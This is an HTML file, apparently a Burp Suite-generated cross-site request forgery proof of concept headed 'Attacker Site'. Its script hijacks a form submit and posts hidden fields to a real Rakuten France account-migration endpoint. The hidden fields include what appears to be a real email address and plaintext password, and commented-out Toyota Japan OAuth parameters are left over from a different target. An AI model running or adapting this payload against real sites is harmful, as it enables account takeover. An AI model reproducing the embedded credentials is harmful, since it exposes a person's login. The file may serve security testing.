<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      window.addEventListener("load", function () {
        function sendData() {
          const XHR = new XMLHttpRequest();
        
          // FormData オブジェクトと form 要素を紐づけます
          const FD  = new FormData(form);
        
          // データが正常に送信された場合に行うことを定義します
          XHR.addEventListener("load", function(event) {
            alert(event.target.responseText);
          });
        
          // エラーが発生した場合に行うことを定義します
          XHR.addEventListener("error", function(event) {
            alert('Oups! Something goes wrong.');
          });
        
          // リクエストをセットアップします
          XHR.open("POST", "https://fr.shopping.rakuten.com/auth/api/users/account/global_id/migration/status");

        
          // 送信したデータは、ユーザーがフォームで提供したものです
          XHR.send(FD);
        }
      
        // form 要素にアクセスしなければなりません
        const form = document.getElementById("myForm");
      
        // フォームの submit イベントを乗っ取ります
        form.addEventListener("submit", function (event) {
          event.preventDefault();
        
          sendData();
        });
      });
    </script>
    <h1>Attacker Site</h1>
    <form id="myForm" action="https://fr.shopping.rakuten.com/auth/api/users/account/global_id/migration/status">
      <input type="hidden" name="usernameOrEmail" value="kou0407hei@gmail.com" />
      <input type="hidden" name="userPassword" value="Beeeeglekota06" />
      <!-- <input type="hidden" name="service_id" value="toyotajp" />
      <input type="hidden" name="client_id" value="ToyotaJpGxWbMmOhfLSQYLDZvvWVex-G" />
      <input type="hidden" name="service_id" value="toyotajp" />
      <input type="hidden" name="device_id" value="NO_DEVICE" />
      <input type="hidden" name="webview" value="false" />
      <input type="hidden" name="redirect_uri" value="https://toyota.j" />
      <input type="hidden" name="back_url" value="https://toyota.jp/webpassport/gate/dc/ma/login?mode=oneid&backurl=https%3A%2F%2Ftoyota.jp%2Fmember%2Fmytoyota%2Fdc%2Ftop" />
      <input type="hidden" name="response_type" value="code id_token" />
      <input type="hidden" name="scope" value="openid" />
      <input type="hidden" name="state" value="ZarPfzSqQEqrGbrG1RXJdcA2h8OILkxh" />
      <input type="hidden" name="nonce" value="vIDPVAPMksT9WZKta1mYGoQGxvBSlhFd" />
      <input type="hidden" name="dealer_code" value="" />
      <input type="hidden" name="os_type" value="" />
      <input type="hidden" name="lat" value="" />
      <input type="hidden" name="lon" value="" />
      <input type="hidden" name="proc" value="true" /> -->
      <input type="submit" value="Submit request from form tag" />
    </form>
  </body>
</html>

